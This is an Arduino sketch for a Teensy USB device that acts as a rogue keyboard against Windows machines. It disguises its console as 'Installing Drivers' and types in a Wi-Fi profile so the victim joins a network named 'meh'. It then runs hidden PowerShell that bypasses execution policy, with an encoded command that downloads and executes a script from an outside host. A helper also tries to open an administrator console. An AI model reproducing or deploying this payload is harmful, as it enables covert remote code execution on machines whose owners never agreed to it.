#define TEENSY2
#ifdef TEENSY2
#define LED_PIN 13
#define LED_PIN 11

    #include<usb_private.h>
#endif



void setup(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=80 LINES=24 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo ^<?xml version=\"1.0\"?^> > %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<name^>meh^</name^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<SSIDConfig^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<SSID^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<hex^>6d6568^</hex^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<name^>meh^</name^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</SSID^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</SSIDConfig^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<connectionType^>ESS^</connectionType^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<connectionMode^>auto^</connectionMode^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<MSM^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<security^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<authEncryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<authentication^>WPA2PSK^</authentication^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<encryption^>AES^</encryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<useOneX^>false^</useOneX^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</authEncryption^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<sharedKey^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<keyType^>passPhrase^</keyType^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<protected^>false^</protected^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^<keyMaterial^>tuna1234^</keyMaterial^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</sharedKey^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</security^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</MSM^> >> %TEMP%\\pl.xml ");
  Keyboard.println("echo ^</WLANProfile^> >> %TEMP%\\pl.xml ");
  Keyboard.println("netsh wlan add profile filename=%TEMP%\\pl.xml ");
  delay(2000);
  Keyboard.println("netsh wlan connect name=meh ");
  delay(7000);
  // allow controlling LED
 // pinMode(LED_PIN, OUTPUT);

  // turn the LED on while we're pwning
  //digitalWrite(LED_PIN, HIGH);

  Keyboard.println("powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYwBoAGkAYwBrAGUAbgBhAHIAbQBzAC4AZwBsAGkAdAB0AGUAcgBwAGEAbgB0AHMALgBvAHIAZwA6ADgAMAAvAEYAdQBmAFgAdgBvAGgAaABFAFcAcQBYACIAKQAKAA==");

}

void loop(){
}
void wait_for_drivers(int sleep)

{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }






